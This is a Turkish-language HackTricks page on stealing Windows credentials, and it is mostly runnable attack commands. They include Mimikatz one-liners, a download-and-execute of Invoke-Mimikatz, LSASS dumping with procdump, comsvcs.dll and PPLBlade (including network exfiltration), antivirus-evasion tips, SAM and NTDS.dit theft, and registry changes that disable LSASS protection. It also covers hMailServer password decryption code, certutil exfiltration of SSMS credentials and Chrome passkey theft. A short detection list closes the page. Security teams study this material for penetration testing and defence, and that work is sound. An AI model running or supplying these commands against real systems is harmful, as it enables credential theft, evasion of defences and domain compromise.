# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz Kimlik Bilgileri
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i **kullanın**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV Bypass

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**meşru bir Microsoft tool'u olduğundan**, Defender tarafından tespit edilmez.\
Bu tool'u **lsass process'ini dump etmek**, **dump'ı download etmek** ve **credentials'ları** dump'tan **local olarak extract etmek** için kullanabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** araçları, **lsass.exe'yi dump etmek için procdump.exe kullanımını** **kötü amaçlı** olarak **tespit edebilir**; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **tespit etmeleridir**. Bu nedenle, procdump'a **lsass.exe adını** vermek **yerine**, lsass.exe'nin **PID değerini** bir **argüman** olarak geçirmek daha **gizli** bir yöntemdir.

### **comsvcs.dll** ile lsass Dump Etme

`C:\Windows\System32` konumunda bulunan **comsvcs.dll** adlı DLL, bir crash durumunda **process memory dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argümanın kullanılması gereksizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump file konumu ikinci bileşeni oluşturur ve üçüncü bileşen kesinlikle **full** kelimesidir. Alternatif bir seçenek mevcut değildir.\
Bu üç bileşen ayrıştırıldıktan sonra DLL, dump file oluşturur ve belirtilen process'in memory içeriğini bu file'a aktarır.\
**comsvcs.dll** kullanılarak lsass process'inin dump edilmesi mümkündür; böylece procdump'ı upload edip çalıştırma ihtiyacı ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Çalıştırma için aşağıdaki command kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi [**lssasy**](https://github.com/Hackndo/lsassy) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Görev Çubuğu'na sağ tıklayın ve Görev Yöneticisi'ne tıklayın
2. Daha fazla ayrıntı'ya tıklayın
3. İşlemler sekmesinde "Local Security Authority Process" işlemini bulun
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Döküm dosyası oluştur" seçeneğine tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan, Microsoft tarafından imzalanmış bir binary'dir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass Dump Etme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), memory dump'ı obfuscate etmeyi ve diske yazmadan uzak workstation'lara aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını bypass etme
2. Defender'ın signature-based detection mekanizmalarından kaçmak için memory dump dosyalarını obfuscate etme
3. Memory dump'ı diske yazmadan (fileless dump), RAW ve SMB upload yöntemleriyle yükleme
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump olmadan SSP tabanlı LSASS dumping

Ink Dragon, `MiniDumpWriteDump` çağrısını hiç yapmayan ve bu nedenle EDR'ın bu API üzerindeki hook'larının hiç tetiklenmediği, **LalsDumper** adlı üç aşamalı bir dumper içerir:<sup>[[3]](#references)</sup>

1. **Aşama 1 loader'ı (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt` dosyasının absolute path'i ile üzerine yazar, patched DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu işlem, **LSASS**'ı malicious DLL'i yeni bir Security Support Provider (SSP) olarak yüklemeye zorlar.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her byte'ı `0x20` ile XOR'lar ve decoded blob'u memory'ye map ettikten sonra execution'ı aktarır.
3. **Aşama 3 dumper'ı** – Map edilen payload, hashed API isimlerinden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) çözümlenen **direct syscalls** kullanarak MiniDump logic'ini yeniden uygular. `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, compressed LSASS dump'ını dosyaya stream eder ve exfiltration'ın daha sonra yapılabilmesi için handle'ı kapatır.

Operator notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı directory içinde tutun. Aşama 1, hard-coded placeholder'ı `rtu.txt` dosyasının absolute path'i ile yeniden yazar; bu dosyaları ayırmak chain'i bozar.
* Registration, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` değerine eklenmesiyle gerçekleşir. LSASS'ın her boot'ta SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz seed edebilirsiniz.
* `%TEMP%\*.ddt` dosyaları compressed dump'lardır. Bunları local olarak decompress edin, ardından credential extraction için Mimikatz/Volatility'ye aktarın.
* `lals.exe` çalıştırıldığında `AddSecurityPackageA` çağrısının başarılı olması için admin/SeTcb rights gerekir; çağrı döndüğünde LSASS rogue SSP'yi transparently yükler ve Aşama 2'yi çalıştırır.
* DLL'in diskten kaldırılması, onu LSASS'tan çıkarmaz. Registry entry'sini silip LSASS'ı restart edin (reboot) veya long-term persistence için bırakın.

## CrackMapExec

### SAM hash'lerini dump et
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dump Etme
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dump et
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır**. Ancak **korumalı oldukları için bunları normal şekilde kopyalayamazsınız**.

### From Registry

Bu dosyaları çalmanın en kolay yolu Registry'den bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**indirin** these files to your Kali machine and **extract the hashes** using:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaların kopyasını alabilirsiniz. Administrator olmanız gerekir.

#### vssadmin kullanma

vssadmin binary'si yalnızca Windows Server sürümlerinde kullanılabilir
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Aşağıda **SAM dosyasının nasıl kopyalanacağına** dair bir örnek verilmiştir (kullanılan sürücü "C:" ve dosya C:\users\Public konumuna kaydedilir); ancak bunu korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kitaptaki kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit'in bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aracını da kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri barındıran **Active Directory**'nin kalbi olarak bilinir. Domain kullanıcılarının **password hash** değerleri burada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesneler hakkındaki ayrıntıları depolamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesneye ait **security descriptor** değerleri burada tutulur; bu sayede depolanan nesnelerin security ve access control işlemleri sağlanır.

Bununla ilgili daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının **bir kısmı `lsass`** belleğinin **içinde** bulunabilir (muhtemelen performans iyileştirmesi amacıyla bir **cache** kullanıldığından, en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash değerlerinin şifresini çözme

Hash değeri 3 kez şifrelenir:

1. **BOOTKEY** ve **RC4** kullanılarak Password Encryption Key (**PEK**) değerinin şifresi çözülür.
2. **PEK** ve **RC4** kullanılarak **hash** değerinin şifresi çözülür.
3. **DES** kullanılarak **hash** değerinin şifresi çözülür.

**PEK**, **her domain controller** üzerinde **aynı değere** sahiptir, ancak **domain controller'ın SYSTEM dosyasındaki BOOTKEY** kullanılarak **NTDS.dit** dosyası içinde **şifrelenir** (**domain controller'lar arasında farklıdır**). Bu nedenle NTDS.dit dosyasından credential bilgilerini almak için **NTDS.dit** ve **SYSTEM** dosyalarına (_C:\Windows\System32\config\SYSTEM_) ihtiyacınız vardır.

### Ntdsutil kullanarak NTDS.dit dosyasını kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
**volume shadow copy** hilesini kullanarak **ntds.dit** dosyasını da kopyalayabilirsiniz. Ayrıca **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacağını unutmayın (yine [**registry'den dump edin veya volume shadow copy** hilesini kullanın](#stealing-sam-and-system)).

### **NTDS.dit'ten hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, **hash'leri çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Bunları geçerli bir domain admin kullanıcısı kullanarak otomatik olarak da **çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**Büyük NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` da kullanılabilir.

### **NTDS.dit dosyasından domain nesnelerini SQLite veritabanına çıkarma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Ham NTDS.dit dosyası zaten alındığında, yalnızca secret'lar değil, daha fazla bilgi çıkarımı için nesnelerin tamamı ve öznitelikleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak sırların şifresinin çözülmesini sağlar (NT ve LM hash'leri, cleartext password gibi supplemental credentials, kerberos veya trust key'leri, NT ve LM password history'leri). Diğer bilgilerle birlikte aşağıdaki veriler çıkarılır: hash'leriyle birlikte user ve machine account'ları, UAC flags, son logon ve password change timestamp'leri, account açıklamaları, adlar, UPN, SPN, group'lar ve recursive membership'ler, organizational unit ağacı ve membership'i, trust türü, yönü ve attribute'ları ile trusted domain'ler...

## Lazagne

Binary'yi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli software'lerden credential çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'den credentials çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç memory'den credentials çıkarmak için kullanılabilir. Şuradan download edin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file'dan credentials çıkarın
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarma
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Şuradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**; parolalar çıkarılacaktır.

## Atıl RDP oturumlarını inceleme ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri her red teamer için kullanışlı olan bir `DumpRDPHistory` tasker’ı içerir:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` altındaki her user hive’ı ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Gelen RDP kanıtları** – kimin sistemi yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log’unu Event ID’leri **21** (başarılı logon) ve **25** (disconnect) açısından sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **disconnected** oturumu hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, verifier ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden replay edilerek `NTDS.dit` alınabilir veya domain controller’larda persistence oluşturulabilir.

### FinalDraft tarafından hedeflenen Registry downgrade’leri

Aynı implant, credential theft işlemini kolaylaştırmak için çeşitli Registry anahtarlarını da değiştirir:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarının yapılması, RDP sırasında tam credential/ticket yeniden kullanımını zorunlu kılar ve pass-the-hash tarzı pivot'ları etkinleştirir.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtering'i devre dışı bırakır; böylece local admin'ler ağ üzerinden kısıtlanmamış token'lar alır.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM administrator'ının log on olmasına izin verir ve saldırganlara başka bir yerleşik high-privilege account sağlar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırır ve LalsDumper gibi dumper'lar için memory access'i trivial hale getirir.

## hMailServer database credentials (post-compromise)

hMailServer, DB password'ünü `[Database] Password=` altında `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında saklar. Değer, static key `THIS_KEY_IS_NOT_SECRET` ve 4-byte word endianness swaps kullanılarak Blowfish ile encrypted hâle getirilir. INI'deki hex string'i şu Python snippet'i ile kullanın:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Açık metin parolasıyla SQL CE database'ini file lock'larını önlemek için kopyalayın, 32-bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekiyorsa upgrade edin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu hMailServer hash formatını (`hashcat` mode `1421`) kullanır. Bu değerleri crack etmek, WinRM/SSH pivot'ları için yeniden kullanılabilir kimlik bilgileri sağlayabilir.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı tooling'ler, LSA logon callback'i `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon password'larını** yakalar. Buradaki fikir, kimlik doğrulama package callback'ini hook'lamak veya wrap etmektir; böylece credentials **logon sırasında** (hash'lenmeden önce) yakalanır, ardından diske yazılır veya operator'e döndürülür. Bu işlem genellikle LSA'ya inject olan ya da LSA'ya register olan ve başarılı her interactive/network logon event'ini username, domain ve password ile kaydeden bir helper kullanılarak uygulanır.<sup>[[1]](#references)</sup>

Operational notes:
- Authentication path'e helper'ı load etmek için local admin/SYSTEM gerekir.
- Captured credentials yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kaydedilmiş connection bilgilerini kullanıcı başına oluşturulan bir `sqlstudio.bin` dosyasında saklar. Dedicated dumper'lar dosyayı parse ederek kaydedilmiş SQL credentials'larını recover edebilir. Yalnızca command output döndüren shell'lerde dosya, çoğunlukla Base64 olarak encode edilip stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Operatör tarafında, dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Chrome on Windows'tan Passkeys / WebAuthn credential theft

Windows host üzerinde **victim user** olarak **Chrome + Google Password Manager synced passkeys** kullanılarak code execution elde edilirse, **admin/SYSTEM** olmadan bile passkeys ilgi çekici bir post-exploitation hedefi haline gelir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel artifact'ler
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**, protobuf ile encode edilmiş **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir process, senkronize passkey'ler için **RP ID**, **username**, **credential ID** ve şifrelenmiş private-key materyalini enumerate edebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** gibi yerel cihaz enrollment durumunu ve senkronize kimlik bilgilerini kurtarmak için kullanılan wrapped secret'ı depolar.<sup>[[4]](#references)</sup>

Hızlı triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM'e bağlı key blob'ları yine de yerel bir imzalama oracle'u olarak kötüye kullanılabilir

Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği durumda depolarsa, kötü amaçlı yazılımın ham private key'i çıkarması gerekmez. Kötü amaçlı yazılım, blob'u **aynı makine** üzerinde yeniden içe aktarabilir ve yerel TPM'den saldırgan tarafından kontrol edilen verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Bu, **hardware binding'in cihaz dışına aktarımı engellediği, ancak ele geçirilmiş endpoint üzerinde aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` değerlerini enumerate edin.
- Bir passkey login başlatın ve yeni bir WebAuthn challenge alın.
- Çalınan `wrapped_identity_private_key` blob'unu victim TPM üzerinde kullanarak cloud-authenticator request binding'i imzalayın.
- Dönen assertion'ı relying party'ye relay edin.
- Bu yöntem, RP `userVerification=preferred` kabul ettiğinde veya **`UV=0`** içeren assertion'ları reddetmediğinde özellikle değerlidir.

2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` dosyasını silerek veya geçerli imzalı bir `device/forget` operation göndererek yeniden onboarding'i zorlayın.
- Onboarding cihazı **`uv_key_pending`** durumunda bırakırsa, attacker-controlled bir UV public key register edin.
- Provider yeni UV key için attestation / secure-hardware origin doğrulaması yapmıyorsa, attacker key'den gelen sonraki imzalar **`UV=1`** olarak kabul edilir.

3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Chrome'un synced-passkey master secret'ı fetch etmesi için recovery veya rejoin'i zorlayın.
- `passkey_enclave_state` dosyasının yeniden oluşturulmasını/değiştirilmesini izleyin, ardından plaintext **security domain secret (SDS)** bellekte bulunduğu sırada Chrome memory dump alın.
- Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki encrypted field'ları decrypt edin ve taşınabilir WebAuthn private key'leri kurtarın.

### DFIR / tespit fikirleri

- **`passkey_enclave_state` dosyasının silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Browser olmayan process'lerin Chrome **`Sync Data\LevelDB`** alanına anormal erişimleri için alert oluşturun.
- **Chrome memory dump** veya şüpheli cross-process memory access için alert oluşturun.
- Tekrarlanan **Google Password Manager recovery PIN** prompt'larını veya beklenmeyen yeniden onboarding işlemlerini araştırın.
- WebAuthn **`signCount`** değerinin synced passkey'ler için çoğu zaman yararlı olmadığını, sabit kalabileceğini unutmayın; bu nedenle klasik clone detection zayıftır.

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)

{{#include ../../banners/hacktricks-training.md}}
